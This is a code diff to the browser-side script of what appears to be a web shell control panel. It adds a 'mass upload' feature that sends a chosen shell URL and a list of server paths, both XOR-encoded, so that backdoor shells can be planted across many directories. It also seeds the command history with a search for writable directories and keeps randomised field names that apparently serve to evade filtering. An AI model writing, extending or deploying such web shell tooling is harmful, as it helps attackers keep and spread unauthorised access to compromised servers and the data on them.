@@ -25,14 +25,33 @@ let uploadForm_e = document.getElementById("uploadForm");
 let LoadForm_e = document.getElementById("LoadForm");
 let EditForm_e = document.getElementById("EditForm");
 let exeForm_e = document.getElementById("exeForm");
+// Mass upload form
+let massuploadBtn_e = document.getElementById("massuploadBtn");
+let massuploadForm_e = document.getElementById("massuploadForm");
+let massUpload_pathes_e = document.getElementById("massUpload_pathes");
+let shell_e = document.getElementById("shell");
 var fileReader = new FileReader();
 var uploadFileData;
 fileReader.onload = function (e) {
     uploadFileData = e.target.result;
 };
+// Mass upload
+let massmodal = document.getElementById('massuploadModel');
+// Get the button that opens the modal
+let massbtn = document.getElementById("massupload_btn");
+// Get the <span> element that closes the modal
+let massspan = document.getElementById("massupload_close");
+// When the user clicks on the button, open the modal
+massbtn.onclick = function () {
+    massmodal.style.display = "block";
+};
+// When the user clicks on <span> (x), close the modal
+massspan.onclick = function () {
+    massmodal.style.display = "none";
+};
 // Get the modal
 let modal = document.getElementById('uploadModel');
-// Get the button that opens the modal
+// Get the button that opens the m	odal
 let btn = document.getElementById("upload_btn");
 // Get the <span> element that closes the modal
 let span = document.getElementById("upload_close");
@@ -51,6 +70,9 @@ window.onclick = function (event) {
     }
     if (event.target == editmodal) {
         editmodal.style.display = "none";
+    }
+    if (event.target == massmodal) {
+        massmodal.style.display = "none";
     }
 };
 let uploaded_list_btn = document.getElementById("uploaded_list_btn");
@@ -171,6 +193,7 @@ exeForm_e.onsubmit = function exe() {
     let helpFlag = false;
     let cmd = commandIn_e.value.trim();
     let option = document.createElement("option");
+    option.value = cmd;
     // Handeling PUT command (Sending)
     if (commandIn_e.value.startsWith("put ")) {
         var a = commandIn_e.value.indexOf(' ');
@@ -212,7 +235,6 @@ exeForm_e.onsubmit = function exe() {
     commandIn_e.value = "";
     commandIn_e.name = "cmd" + (Math.random() * 254);
     if (cmd != "") {
-        option.value = cmd;
         let found = false;
         let options = historySelect_e.children;
         for (let o of options) {
@@ -251,6 +273,16 @@ window.onload = function initial() {
     });
     commandIn_e.value = "";
     commandIn_e.name = "cmd" + (Math.random() * 254);
+    let defaultShells = document.getElementById("DefaultShells");
+    for (var key in filesToDownload) {
+        let tmp = document.createElement("option");
+        tmp.value = key;
+        defaultShells.appendChild(tmp);
+    }
+    // <any>(document.getElementById("shell")).name = "shell" + (Math.random() * 254);
+    let tmp = document.createElement("option");
+    tmp.value = "find . -writable -type d";
+    historySelect_e.appendChild(tmp);
     return false;
 };
 uploadForm_e.onsubmit = function doUpload() {
@@ -318,4 +350,33 @@ EditForm_e.onsubmit = function doEdit() {
     xhttp.send(formData);
     return false;
 };
-var updated;
+massuploadForm_e.onsubmit = function () {
+    var url = window.location.origin + window.location.pathname;
+    var xhttp = new XMLHttpRequest();
+    var formData = new FormData();
+    var shell = shell_e.value;
+    var shellURL = "";
+    for (var key in filesToDownload) {
+        if (key == shell) {
+            shellURL = filesToDownload[key];
+            // console.log("here");
+        }
+    }
+    if (shellURL == "") {
+        shellURL = shell;
+    }
+    shellURL = xor_string_encode(shellURL);
+    var pathes = xor_string_encode(massUpload_pathes_e.value);
+    console.log(massUpload_pathes_e.value);
+    formData.append("shellURL", shellURL);
+    formData.append("pathes", pathes);
+    // console.log(edit_path_load_e.value);
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+            document.getElementById("massuploadBtn").innerHTML = this.responseText;
+        }
+    };
+    xhttp.open('post', url, true);
+    xhttp.send(formData);
+    return false;
+};
